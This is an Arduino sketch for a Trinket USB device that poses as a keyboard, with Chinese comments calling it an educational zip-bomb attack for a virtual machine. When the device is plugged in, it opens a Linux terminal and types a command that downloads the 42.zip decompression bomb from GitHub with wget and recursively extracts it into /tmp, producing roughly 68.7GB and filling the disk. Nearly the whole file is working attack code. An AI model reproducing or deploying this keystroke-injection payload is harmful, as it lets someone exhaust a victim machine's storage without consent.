#include <TrinketHidCombo.h>

// === Linux Zip Bomb 攻擊 (教育用途) ===
// 目標: 下載並解壓縮 42.zip 第一層 (68.7GB)
// 測試環境: 虛擬機
// 支援桌面環境: 通用 (使用 Ctrl+Alt+T)
// 參考: https://github.com/iamtraction/ZOD

void setup() {
  TrinketHidCombo.begin(); // 初始化 USB HID
  delay(1000);  // 等待 USB 裝置被系統辨識
}

void loop() {
  // === 步驟 1：使用快捷鍵開啟終端機 (Ctrl+Alt+T) ===
  // 這是大多數 Linux 發行版的通用快捷鍵
  // 適用於: Ubuntu, Fedora, Debian, Linux Mint 等
  TrinketHidCombo.pressKey(KEYCODE_MOD_LEFT_CONTROL | KEYCODE_MOD_LEFT_ALT, KEYCODE_T);
  delay(50);
  TrinketHidCombo.pressKey(0, 0);  // 釋放按鍵
  delay(2000);  // 等待終端機啟動

  // === 步驟 2：下載並完整遞迴解壓（達到 68.7GB）===
  // 命令說明:
  // - wget: 下載 42.zip
  // - 7z x: 解壓第一層
  // - for i in 1 2 3 4: 遞迴解壓 4 層 (lib→book→paper→leaf)
  // - find + 7z: 找到所有 zip 並解壓，然後刪除
  // 警告: 這會產生 68.7GB 資料！確保在有足夠空間的VM中執行
  TrinketHidCombo.print("cd /tmp && wget -q 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -maxdepth 1 -name '*.zip' -type f -exec sh -c '7z x -p42 -y \"$1\" && rm \"$1\"' _ {} \\;; done");
  delay(500);  // 增加延遲確保長命令完整傳送

  TrinketHidCombo.pressKey(0, KEYCODE_ENTER);
  delay(50);
  TrinketHidCombo.pressKey(0, 0);

  // === 完成 - 保持 USB 連線 ===
  // 第一層解壓會產生 16 個 zip 檔，共 68.7GB
  for(;;) {
    TrinketHidCombo.poll();  // 維持 USB HID 連線
    delay(100);
  }
}
